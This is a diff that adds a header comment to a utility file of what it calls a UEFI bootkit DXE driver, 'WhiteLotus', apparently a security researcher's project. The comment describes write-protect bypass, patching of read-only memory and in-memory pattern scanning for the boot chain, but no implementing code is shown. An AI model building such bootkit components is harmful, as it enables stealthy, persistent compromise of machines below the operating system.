@@ -1,3 +1,29 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+ *  File     : Utils.c
+ * ============================================================
+ *
+ *  Description:
+ *    General-purpose utility functions shared across all DXE
+ *    driver modules. Includes: byte-pattern scanner
+ *    (FindPattern with wildcard support), write-protect bypass
+ *    (DisableWriteProtect/EnableWriteProtect, CET/Shadow Stack
+ *    aware), CopyWpMem for patching read-only memory, a
+ *    UEFI timer-based sleep (RtlSleep/RtlStall), and a
+ *    case-insensitive bounded wide string compare (StrniCmp).
+ *
+ *  Purpose:
+ *    - Provide shared low-level helpers for in-memory
+ *      scanning and patching throughout the boot-time chain.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "WhiteLotus.h"
 
 
